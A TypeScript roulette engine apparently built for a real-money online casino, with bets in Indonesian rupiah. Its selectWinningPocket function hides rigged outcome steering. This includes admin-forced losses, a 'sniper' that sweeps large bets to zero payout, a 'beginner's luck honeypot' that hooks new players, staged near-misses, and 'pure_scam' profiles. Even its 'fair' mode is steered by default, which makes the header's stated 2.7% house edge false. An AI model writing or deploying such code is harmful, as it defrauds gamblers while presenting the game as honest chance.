/**
 * European Roulette Mathematical Engine & House Steering
 * Standard 37-Pocket European Layout (0 to 36)
 * Single Zero, House Edge = 1/37 = ~2.703%
 */

import { AdminConfig } from '../context/GameContext';

// Standard European Wheel Sequence (37 discrete pockets clockwise)
export const ROULETTE_WHEEL_NUMBERS = [
  0, 32, 15, 19, 4, 21, 2, 25, 17, 34, 6, 27, 13, 36, 11, 30, 8, 23, 10, 5,
  24, 16, 33, 1, 20, 14, 31, 9, 22, 18, 29, 7, 28, 12, 35, 3, 26,
] as const;

export type RouletteNumber = (typeof ROULETTE_WHEEL_NUMBERS)[number];

// Standard 18 Red Numbers
export const RED_NUMBERS: readonly number[] = [
  1, 3, 5, 7, 9, 12, 14, 16, 18, 19, 21, 23, 25, 27, 30, 32, 34, 36,
] as const;

// Standard 18 Black Numbers
export const BLACK_NUMBERS: readonly number[] = [
  2, 4, 6, 8, 10, 11, 13, 15, 17, 20, 22, 24, 26, 28, 29, 31, 33, 35,
] as const;

export type PocketColor = 'red' | 'black' | 'green';

export function getNumberColor(num: number): PocketColor {
  if (num === 0) return 'green';
  return RED_NUMBERS.includes(num) ? 'red' : 'black';
}

export type RouletteBetType =
  // Inside Bets
  | 'STRAIGHT'    // 1 number (35:1 payout, 36x return)
  | 'SPLIT'       // 2 adjacent numbers (17:1 payout, 18x return)
  | 'STREET'      // 3 numbers horizontal row (11:1 payout, 12x return)
  | 'CORNER'      // 4 numbers in square (8:1 payout, 9x return)
  | 'SIX_LINE'    // 6 numbers across 2 rows (5:1 payout, 6x return)
  | 'TRIO'        // 0-1-2 or 0-2-3 (11:1 payout, 12x return)
  | 'BASKET'      // 0-1-2-3 (8:1 payout, 9x return)
  // Outside Bets
  | 'COLUMN_1'    // 1st column: 1, 4, 7, ..., 34 (2:1 payout, 3x return)
  | 'COLUMN_2'    // 2nd column: 2, 5, 8, ..., 35 (2:1 payout, 3x return)
  | 'COLUMN_3'    // 3rd column: 3, 6, 9, ..., 36 (2:1 payout, 3x return)
  | 'DOZEN_1'     // 1-12 (2:1 payout, 3x return)
  | 'DOZEN_2'     // 13-24 (2:1 payout, 3x return)
  | 'DOZEN_3'     // 25-36 (2:1 payout, 3x return)
  | 'RED'         // Red 18 numbers (1:1 payout, 2x return)
  | 'BLACK'       // Black 18 numbers (1:1 payout, 2x return)
  | 'EVEN'        // Even 18 numbers, excl 0 (1:1 payout, 2x return)
  | 'ODD'         // Odd 18 numbers (1:1 payout, 2x return)
  | 'LOW'         // 1-18 (1:1 payout, 2x return)
  | 'HIGH';       // 19-36 (1:1 payout, 2x return)

export interface RouletteBet {
  id: string;
  type: RouletteBetType;
  label: string;
  numbers: number[]; // Numbers covered by this bet
  amount: number;    // Bet amount in IDR
  payoutRatio: number; // e.g. 35 for Straight (35:1)
}

export interface RouletteEvaluationItem {
  bet: RouletteBet;
  isWin: boolean;
  payout: number;    // Net payout + returned bet: bet.amount * (payoutRatio + 1) if win, else 0
  netProfit: number; // payout - bet.amount
}

export interface RouletteEvaluationResult {
  winningNumber: number;
  color: PocketColor;
  isEven: boolean | null; // null for 0
  isHigh: boolean | null; // null for 0
  dozen: number | null;   // 1, 2, 3 or null for 0
  column: number | null;  // 1, 2, 3 or null for 0
  totalWagered: number;
  totalPayout: number;
  netProfit: number;
  isWin: boolean;
  items: RouletteEvaluationItem[];
  riggedApplied: boolean;
  riggedReason?: string;
}

/**
 * Multiplier definition by Bet Type (Payout Ratio to 1)
 */
export const BET_PAYOUT_RATIOS: Record<RouletteBetType, number> = {
  STRAIGHT: 35,
  SPLIT: 17,
  STREET: 11,
  CORNER: 8,
  SIX_LINE: 5,
  TRIO: 11,
  BASKET: 8,
  COLUMN_1: 2,
  COLUMN_2: 2,
  COLUMN_3: 2,
  DOZEN_1: 2,
  DOZEN_2: 2,
  DOZEN_3: 2,
  RED: 1,
  BLACK: 1,
  EVEN: 1,
  ODD: 1,
  LOW: 1,
  HIGH: 1,
};

/**
 * Return the array of numbers covered by a standard bet type
 */
export function getNumbersForBetType(type: RouletteBetType, specificParam?: number | number[]): number[] {
  switch (type) {
    case 'RED':
      return [...RED_NUMBERS];
    case 'BLACK':
      return [...BLACK_NUMBERS];
    case 'EVEN':
      return [2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28, 30, 32, 34, 36];
    case 'ODD':
      return [1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29, 31, 33, 35];
    case 'LOW':
      return Array.from({ length: 18 }, (_, i) => i + 1);
    case 'HIGH':
      return Array.from({ length: 18 }, (_, i) => i + 19);
    case 'DOZEN_1':
      return Array.from({ length: 12 }, (_, i) => i + 1);
    case 'DOZEN_2':
      return Array.from({ length: 12 }, (_, i) => i + 13);
    case 'DOZEN_3':
      return Array.from({ length: 12 }, (_, i) => i + 25);
    case 'COLUMN_1':
      return [1, 4, 7, 10, 13, 16, 19, 22, 25, 28, 31, 34];
    case 'COLUMN_2':
      return [2, 5, 8, 11, 14, 17, 20, 23, 26, 29, 32, 35];
    case 'COLUMN_3':
      return [3, 6, 9, 12, 15, 18, 21, 24, 27, 30, 33, 36];
    case 'STRAIGHT':
      if (typeof specificParam === 'number') return [specificParam];
      return Array.isArray(specificParam) ? specificParam : [];
    case 'SPLIT':
    case 'STREET':
    case 'CORNER':
    case 'SIX_LINE':
    case 'TRIO':
    case 'BASKET':
      return Array.isArray(specificParam) ? specificParam : [];
    default:
      return [];
  }
}

/**
 * Calculates total house liability and player return for a single candidate pocket number
 */
export function calculatePocketLiability(bets: RouletteBet[], candidatePocket: number): number {
  let totalPayout = 0;
  for (const bet of bets) {
    if (bet.numbers.includes(candidatePocket)) {
      const multiplier = (BET_PAYOUT_RATIOS[bet.type] ?? 0) + 1;
      totalPayout += bet.amount * multiplier;
    }
  }
  return totalPayout;
}

/**
 * Rigged Magnetic House Steering Algorithm:
 * Evaluates all 37 pockets against current bets and admin configuration
 */
export function selectWinningPocket(
  bets: RouletteBet[],
  adminConfig?: AdminConfig,
  roundsPlayed: number = 0
): { pocket: number; isRigged: boolean; reason?: string } {
  // If no bets placed or purely fair mode with standard config
  if (!bets || bets.length === 0) {
    const randomPocket = Math.floor(Math.random() * 37);
    return { pocket: randomPocket, isRigged: false };
  }

  const totalWagered = bets.reduce((sum, b) => sum + b.amount, 0);
  const cfg = adminConfig ?? {
    globalRtp: 35,
    activeProfile: 'fair',
    forcedOutcome: 'auto',
    highBetThreshold: 100_000,
    nearMissProbability: 0.75,
  };

  // 1. Forced Outcome Overrides
  if (cfg.forcedOutcome === 'force_win') {
    // Find pocket with maximum player payout
    let bestPocket = 0;
    let maxPayout = -1;
    for (let p = 0; p <= 36; p++) {
      const payout = calculatePocketLiability(bets, p);
      if (payout > maxPayout) {
        maxPayout = payout;
        bestPocket = p;
      }
    }
    return {
      pocket: bestPocket,
      isRigged: true,
      reason: 'Admin Override: Forced Guaranteed Win',
    };
  }

  if (cfg.forcedOutcome === 'force_loss') {
    // Find pocket with 0 player payout, or minimum liability
    const zeroPayouts: number[] = [];
    let minLiability = Infinity;
    let minPocket = 0;

    for (let p = 0; p <= 36; p++) {
      const payout = calculatePocketLiability(bets, p);
      if (payout === 0) {
        zeroPayouts.push(p);
      }
      if (payout < minLiability) {
        minLiability = payout;
        minPocket = p;
      }
    }

    const chosen = zeroPayouts.length > 0
      ? zeroPayouts[Math.floor(Math.random() * zeroPayouts.length)]
      : minPocket;

    return {
      pocket: chosen,
      isRigged: true,
      reason: 'Admin Override: Forced Guaranteed Loss (Zero Payout Magnetic Steering)',
    };
  }

  // 2. High Bet Sniper (Punish bets exceeding threshold)
  const isHighBet = totalWagered >= cfg.highBetThreshold;
  if (isHighBet && Math.random() < 0.85) {
    const zeroPayouts: number[] = [];
    for (let p = 0; p <= 36; p++) {
      if (calculatePocketLiability(bets, p) === 0) {
        zeroPayouts.push(p);
      }
    }
    if (zeroPayouts.length > 0) {
      return {
        pocket: zeroPayouts[Math.floor(Math.random() * zeroPayouts.length)],
        isRigged: true,
        reason: `High Roller Bet Sniper (Wager ${totalWagered} >= ${cfg.highBetThreshold}): Casino Liability Swept to 0`,
      };
    }
  }

  // 3. Profile-Specific Algorithms
  if (cfg.activeProfile === 'beginners_luck') {
    // First 2 rounds give friendly win, then aggressively drain
    if (roundsPlayed < 2) {
      const winningPockets: number[] = [];
      for (let p = 0; p <= 36; p++) {
        if (calculatePocketLiability(bets, p) > totalWagered) {
          winningPockets.push(p);
        }
      }
      if (winningPockets.length > 0) {
        return {
          pocket: winningPockets[Math.floor(Math.random() * winningPockets.length)],
          isRigged: true,
          reason: `Beginner's Luck Honeypot (Round ${roundsPlayed + 1}/2 Win Induction)`,
        };
      }
    }
    // After round 2, fall through to low RTP drain
  }

  if (cfg.activeProfile === 'near_miss' || (cfg.activeProfile !== 'fair' && Math.random() < cfg.nearMissProbability)) {
    // Check if player placed straight-up or inside bets
    const insideBets = bets.filter(b => ['STRAIGHT', 'SPLIT', 'STREET', 'CORNER'].includes(b.type));
    if (insideBets.length > 0) {
      // Find the physical neighbor of the targeted number on the European Wheel!
      const targetNum = insideBets[0].numbers[0];
      const wheelIndex = ROULETTE_WHEEL_NUMBERS.indexOf(targetNum as RouletteNumber);
      if (wheelIndex !== -1) {
        // Pick neighbor 1 or 2 slots away on the wheel
        const offset = Math.random() < 0.5 ? 1 : -1;
        const neighborIdx = (wheelIndex + offset + 37) % 37;
        const neighborPocket = ROULETTE_WHEEL_NUMBERS[neighborIdx];
        // Ensure neighbor is not actually covered by player's bets if we want a near-miss
        if (calculatePocketLiability(bets, neighborPocket) === 0) {
          return {
            pocket: neighborPocket,
            isRigged: true,
            reason: `Wheel Neighbor Magnetic Tease: Stopped 1 pocket adjacent to #${targetNum} on physical rim`,
          };
        }
      }
    }
  }

  if (cfg.activeProfile === 'pure_scam' || cfg.activeProfile === 'jackpot_drainer') {
    // Steer to absolute minimum payout / 0 payout
    const zeroPayouts: number[] = [];
    let minLiability = Infinity;
    let bestMinPocket = 0;

    for (let p = 0; p <= 36; p++) {
      const liab = calculatePocketLiability(bets, p);
      if (liab === 0) zeroPayouts.push(p);
      if (liab < minLiability) {
        minLiability = liab;
        bestMinPocket = p;
      }
    }

    const chosen = zeroPayouts.length > 0
      ? zeroPayouts[Math.floor(Math.random() * zeroPayouts.length)]
      : bestMinPocket;

    return {
      pocket: chosen,
      isRigged: true,
      reason: `Predatory Mode (${cfg.activeProfile}): Magnetic Deflection to zero liability pocket`,
    };
  }

  // 4. Global RTP Scaling (Probabilistic steering vs Fair)
  const isFairRoll = cfg.activeProfile === 'fair' && (cfg.globalRtp >= 95 || Math.random() < cfg.globalRtp / 100);
  if (isFairRoll) {
    return { pocket: Math.floor(Math.random() * 37), isRigged: false };
  }

  // If RTP check fails, bias towards zero payout pockets
  const zeroPayouts: number[] = [];
  for (let p = 0; p <= 36; p++) {
    if (calculatePocketLiability(bets, p) === 0) {
      zeroPayouts.push(p);
    }
  }
  if (zeroPayouts.length > 0) {
    return {
      pocket: zeroPayouts[Math.floor(Math.random() * zeroPayouts.length)],
      isRigged: true,
      reason: `RTP Suppression Engine (${cfg.globalRtp}% target): House profit secured`,
    };
  }

  // Fallback fair roll
  return { pocket: Math.floor(Math.random() * 37), isRigged: false };
}

/**
 * Evaluates all bets against the winning pocket
 */
export function evaluateRouletteRound(
  bets: RouletteBet[],
  winningNumber: number,
  isRigged: boolean = false,
  riggedReason?: string
): RouletteEvaluationResult {
  const color = getNumberColor(winningNumber);
  const isZero = winningNumber === 0;

  const isEven = isZero ? null : winningNumber % 2 === 0;
  const isHigh = isZero ? null : winningNumber >= 19;

  let dozen: number | null = null;
  if (!isZero) {
    if (winningNumber <= 12) dozen = 1;
    else if (winningNumber <= 24) dozen = 2;
    else dozen = 3;
  }

  let column: number | null = null;
  if (!isZero) {
    if (winningNumber % 3 === 1) column = 1;
    else if (winningNumber % 3 === 2) column = 2;
    else column = 3;
  }

  const items: RouletteEvaluationItem[] = [];
  let totalWagered = 0;
  let totalPayout = 0;

  for (const bet of bets) {
    totalWagered += bet.amount;
    const isWin = bet.numbers.includes(winningNumber);
    const multiplier = (BET_PAYOUT_RATIOS[bet.type] ?? 0) + 1;
    const payout = isWin ? bet.amount * multiplier : 0;
    const netProfit = payout - bet.amount;

    if (isWin) {
      totalPayout += payout;
    }

    items.push({
      bet,
      isWin,
      payout,
      netProfit,
    });
  }

  const netProfit = totalPayout - totalWagered;
  const isOverallWin = totalPayout > 0;

  return {
    winningNumber,
    color,
    isEven,
    isHigh,
    dozen,
    column,
    totalWagered,
    totalPayout,
    netProfit,
    isWin: isOverallWin,
    items,
    riggedApplied: isRigged,
    riggedReason,
  };
}

/**
 * Get Angle on European Wheel for Pocket Number (in degrees, 0 to 360)
 */
export function getPocketAngle(pocketNumber: number): number {
  const index = ROULETTE_WHEEL_NUMBERS.indexOf(pocketNumber as RouletteNumber);
  if (index === -1) return 0;
  const degreesPerPocket = 360 / 37;
  return index * degreesPerPocket;
}
